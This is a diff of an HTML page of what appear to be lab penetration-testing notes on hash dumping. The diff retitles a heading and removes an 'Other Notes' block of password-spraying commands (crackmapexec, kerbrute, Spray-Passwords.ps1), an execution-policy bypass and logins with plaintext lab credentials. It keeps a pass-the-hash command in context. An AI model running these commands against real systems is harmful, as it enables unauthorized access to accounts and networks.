@@ -173,7 +173,7 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="hash-dumping"><a class="header" href="#hash-dumping">Hash Dumping</a></h1>
+                        <h2 id="hash-dumping"><a class="header" href="#hash-dumping">Hash Dumping</a></h2>
 <h3 id="sam-dumping"><a class="header" href="#sam-dumping">SAM Dumping</a></h3>
 <pre><code>Dumping the SAM hashes on Victim
 
@@ -192,36 +192,6 @@ samdump2 system sam # Less Reliable
 <pre><code># Put DC IP or IP where you want to Pivot, the user is from SAM hash, Modify the hash and remove dots and name.
 
 crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -H aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -x ipconfig
-</code></pre>
-<h3 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h3>
-<pre><code>
-xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
-net accounts
-
-$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-$PDC = ($domainObj.PdcRoleOwner).Name
-$SearchString = "LDAP://"
-$SearchString += $PDC + "/"
-$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
-$SearchString += $DistinguishedName
-New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
-
-cd C:\Tools
-powershell -ep bypass
-.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
-
-
-cat users.txt
-crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-
-
-crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
-
-type .\usernames.txt
-.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
-
-
-Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
 </code></pre>
 
                     </main>
